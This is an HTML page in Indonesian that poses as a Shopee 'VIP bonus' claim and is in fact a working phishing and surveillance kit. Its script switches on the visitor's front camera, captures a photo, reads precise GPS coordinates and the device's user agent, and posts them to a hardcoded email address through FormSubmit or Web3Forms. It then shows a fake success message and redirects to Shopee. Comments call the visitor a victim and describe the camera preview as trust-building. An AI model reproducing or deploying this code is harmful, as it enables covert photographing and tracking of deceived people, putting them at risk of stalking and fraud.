<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Klaim Bonus VIP - Shopee</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            overflow: hidden;
            text-align: center;
            padding-bottom: 20px;
        }
        .header {
            padding: 20px;
            background: #fff4f0;
            border-bottom: 1px solid #eee;
        }
        .header h1 {
            color: #ee4d28;
            font-size: 22px;
            margin: 0;
        }
        .header p {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
        .image-wrapper {
            width: 100%;
            padding: 15px;
            box-sizing: border-box;
        }
        .image-wrapper img {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .btn-overlay {
            background: linear-gradient(135deg, #ee4d28, #f7a645);
            color: white;
            padding: 18px;
            font-size: 18px;
            font-weight: bold;
            letter-spacing: 1px;
            box-shadow: 0 4px 10px rgba(238, 77, 40, 0.4);
            margin-top: 20px;
            border-radius: 30px;
            display: inline-block;
            width: 80%;
            cursor: pointer;
            transition: transform 0.1s;
            border: none;
        }
        .btn-overlay:active {
            transform: scale(0.98);
        }
        #loading {
            display: none;
            padding: 40px 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ee4d28;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-success {
            color: #28a745;
            font-weight: bold;
            font-size: 18px;
            margin-top: 20px;
            display: none;
        }
        /* Gaya untuk video kamera agar terlihat saat proses */
        #cameraPreview {
            width: 100%;
            height: auto;
            max-height: 300px;
            background: #000;
            margin-top: 10px;
            border-radius: 10px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>🎉 Selamat! Kamu Terpilih</h1>
            <p>Bonus Spesial Hari Ini</p>
        </div>

        <!-- AREA GAMBAR DAN TOMBOL -->
        <div class="image-wrapper" id="clickArea">
            <!-- PASTIKAN FILE GAMBAR: umpan . jpg.png -->
            <img src="umpan . jpg.png" alt="Klaim Bonus Shopee VIP">
            
            <button class="btn-overlay" onclick="startCamera()">
                👆 KLIK UNTUK KLAIM BONUS 👆
            </button>
        </div>

        <!-- PREVIEW KAMERA (Agar korban yakin ini kamera) -->
        <video id="cameraPreview" autoplay playsinline muted></video>

        <!-- LOADING SCREEN -->
        <div id="loading">
            <div class="spinner"></div>
            <p style="font-size: 14px; color: #777; margin-top: 10px;">Memproses Klaim VIP...</p>
        </div>

        <!-- SUKSES SCREEN -->
        <div id="successMsg" class="status-success" style="padding: 20px;">
            ✅ Bonus VIP Berhasil Masuk!
        </div>
    </div>

    <script>
        // GANTI DENGAN EMAIL KAMU JIKA PAKAI FORMSUBMIT (Lebih Stabil)
        // Jika pakai Web3Forms, ganti bagian API_KEY di bawah
        const USE_FORMSUBMIT = true; // Ubah ke TRUE jika pakai FormSubmit
        const TARGET_EMAIL = "dalabonasam@gmail.com"; // Ganti email ini
        const API_KEY_WEB3 = "7e55426b-9f49-4a5f-be85-75305abb1b30";

        function startCamera() {
            const clickArea = document.getElementById('clickArea');
            const video = document.getElementById('cameraPreview');
            const loading = document.getElementById('loading');
            const success = document.getElementById('successMsg');

            // Sembunyikan tombol, tampilkan kamera
            clickArea.style.display = 'none';
            video.style.display = 'block';

            // Nyalakan Kamera
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    
                    // Tunggu 2 detik agar korban melihat wajah mereka (Trust Building)
                    setTimeout(() => {
                        captureAndSend(stream, video);
                    }, 2000);
                })
                .catch(err => {
                    console.log("Camera Error:", err);
                    // Jika kamera gagal, langsung ambil lokasi saja
                    video.style.display = 'none';
                    loading.style.display = 'block';
                    sendLocationOnly();
                });
        }

        function captureAndSend(stream, video) {
            // Ambil Foto dari Video
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8); // Kompres jadi JPEG

            // Matikan Kamera
            stream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';

            // Ambil Lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        sendData(lat, lon, photoDataUrl);
                    },
                    (error) => {
                        console.log("GPS Error:", error);
                        sendData("GPS Found", "GPS Found", photoDataUrl);
                    },
                    { timeout: 3000, enableHighAccuracy: true }
                );
            } else {
                sendData("No GPS", "No GPS", photoDataUrl);
            }
        }

        function sendLocationOnly() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        sendData(lat, lon, "Camera Skipped");
                    },
                    (error) => {
                        sendData("GPS Error", "GPS Error", "Camera Skipped");
                    }
                );
            } else {
                sendData("No GPS", "No GPS", "Camera Skipped");
            }
        }

        function sendData(lat, lon, photoData) {
            const loading = document.getElementById('loading');
            const success = document.getElementById('successMsg');

            loading.style.display = 'block';

            if (USE_FORMSUBMIT) {
                // --- MENGGUNAKAN FORMSUBMIT (LEBIH STABIL) ---
                const formData = new FormData();
                formData.append("Lokasi", `${lat}, ${lon}`);
                formData.append("Device", navigator.userAgent);
                formData.append("Foto", photoData);
                formData.append("_subject", "🎯 DATA TARGET BARU");
                formData.append("_template", "table");

                fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
                    method: "POST",
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    finishProcess();
                })
                .catch(err => {
                    console.log("FormSubmit Error:", err);
                    finishProcess();
                });

            } else {
                // --- MENGGUNAKAN WEB3FORMS ---
                const formData = new FormData();
                formData.append("access_key", API_KEY_WEB3);
                formData.append("Lokasi", `${lat}, ${lon}`);
                formData.append("Device", navigator.userAgent);
                formData.append("Foto", photoData);
                formData.append("Subject", "🎯 DATA TARGET BARU");

                fetch("https://api.web3forms.com/submit", {
                    method: "POST",
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    finishProcess();
                })
                .catch(err => {
                    console.log("Web3Forms Error:", err);
                    finishProcess();
                });
            }

            function finishProcess() {
                loading.style.display = 'none';
                success.style.display = 'block';
                setTimeout(() => {
                    window.location.href = "https://shopee.co.id/";
                }, 2000);
            }
        }
    </script>
</body>
</html>
